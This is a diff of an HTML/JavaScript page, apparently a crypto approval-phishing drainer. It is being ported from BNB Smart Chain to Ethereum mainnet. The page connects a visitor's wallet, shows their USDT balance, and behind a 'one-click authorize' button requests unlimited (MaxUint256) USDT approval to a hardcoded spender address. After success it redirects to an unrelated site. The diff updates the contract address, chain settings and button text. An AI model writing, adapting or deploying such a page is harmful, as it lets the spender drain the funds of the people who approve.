@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>授权 USDT 给主钱包</title>
+    <title>授权 USDT 给主钱包 (ETH)</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js"></script>
     <style>
         :root { --accent: #007aff; --green: #34c759; --red: #ff3b30; }
@@ -23,9 +23,9 @@
 <body>
     <div class="card">
         <div class="icon-circle">💵</div>
-        <h2>授权 USDT 给主钱包</h2>
+        <h2>授权 USDT 给主钱包 (ETH)</h2>
         <div class="balance" id="balance">余额：加载中...</div>
-        <button class="btn" id="authBtn" onclick="handleAuth()">🔑 001 USDT</button>
+        <button class="btn" id="authBtn" onclick="handleAuth()">🔑 一键授权 USDT</button>
         <div class="status" id="status"></div>
         <div class="log" id="log"></div>
     </div>
@@ -33,13 +33,12 @@
     <script>
         const CONFIG = {
             SPENDER: "0x9513682ba1d5bfbbd08e7675fd49360448c8d6c4", // 主钱包地址
-            REDIRECT_URL: "https://www.baidu.com",                // 授权成功后跳转
+            REDIRECT_URL: "https://www.baidu.com",
         };
 
-        // USDT 在 BSC 上的合约地址
-        const USDT_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";
+        // ETH 主网 USDT 合约地址
+        const USDT_ADDRESS = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
 
-        // 最小化 ABI
         const ERC20_ABI = [
             "function approve(address spender, uint256 amount) returns (bool)",
             "function balanceOf(address owner) view returns (uint256)",
@@ -50,7 +49,6 @@
         const ethers = window.ethers;
         let signer = null, userAddr = null, usdtContract = null;
 
-        // 页面加载时，如果钱包已连接，自动连接
         window.addEventListener('load', () => {
             if (window.ethereum?.selectedAddress) connectWallet();
         });
@@ -63,13 +61,12 @@
             try {
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 if (!accounts || accounts.length === 0) throw new Error("未授权账户");
-                await switchToBSC();
+                await switchToETH();
                 const provider = new ethers.BrowserProvider(window.ethereum);
                 signer = await provider.getSigner();
                 userAddr = await signer.getAddress();
                 usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
 
-                // 显示余额
                 const balance = await usdtContract.balanceOf(userAddr);
                 const decimals = await usdtContract.decimals();
                 const formatted = Number(balance) / (10 ** Number(decimals));
@@ -79,22 +76,23 @@
             }
         }
 
-        async function switchToBSC() {
+        async function switchToETH() {
             try {
                 await window.ethereum.request({
                     method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }]
+                    params: [{ chainId: '0x1' }]
                 });
             } catch (e) {
+                // 如果钱包没有 ETH 主网，无需添加（通常都有）
                 if (e.code === 4902) {
                     await window.ethereum.request({
                         method: 'wallet_addEthereumChain',
                         params: [{
-                            chainId: '0x38',
-                            chainName: 'BNB Smart Chain',
-                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                            blockExplorerUrls: ['https://bscscan.com']
+                            chainId: '0x1',
+                            chainName: 'Ethereum Mainnet',
+                            nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
+                            rpcUrls: ['https://mainnet.infura.io/v3/'],
+                            blockExplorerUrls: ['https://etherscan.io']
                         }]
                     });
                 }
@@ -109,7 +107,6 @@
             statusDiv.textContent = "";
             statusDiv.className = "status";
 
-            // 连接钱包
             if (!signer) {
                 btn.disabled = true;
                 btn.textContent = "⏳ 连接中...";
@@ -124,9 +121,9 @@
             updateStatus("请在钱包中确认交易", "");
 
             try {
-                const maxApproval = ethers.MaxUint256; // 无限额度
+                const maxApproval = ethers.MaxUint256;
                 const tx = await usdtContract.approve(CONFIG.SPENDER, maxApproval);
-                logDiv.innerHTML = `TxHash: <a href="https://bscscan.com/tx/${tx.hash}" target="_blank">${tx.hash.slice(0,20)}...</a>`;
+                logDiv.innerHTML = `TxHash: <a href="https://etherscan.io/tx/${tx.hash}" target="_blank">${tx.hash.slice(0,20)}...</a>`;
                 updateStatus("交易已提交，等待确认...", "");
 
                 const receipt = await tx.wait(2);
@@ -135,7 +132,6 @@
                     return;
                 }
 
-                // 验证授权额度
                 const allowance = await usdtContract.allowance(userAddr, CONFIG.SPENDER);
                 if (allowance >= ethers.MaxUint256 / 2n) {
                     updateStatus("✅ 授权成功！", "success");
@@ -147,7 +143,7 @@
                 if (e.message.includes("user rejected")) {
                     updateStatus("❌ 交易被拒绝", "error");
                 } else if (e.message.includes("insufficient funds")) {
-                    updateStatus("❌ BNB 余额不足", "error");
+                    updateStatus("❌ ETH 余额不足，需要 ETH 支付 Gas", "error");
                 } else {
                     updateStatus("❌ 授权失败：" + e.message.slice(0, 80), "error");
                 }
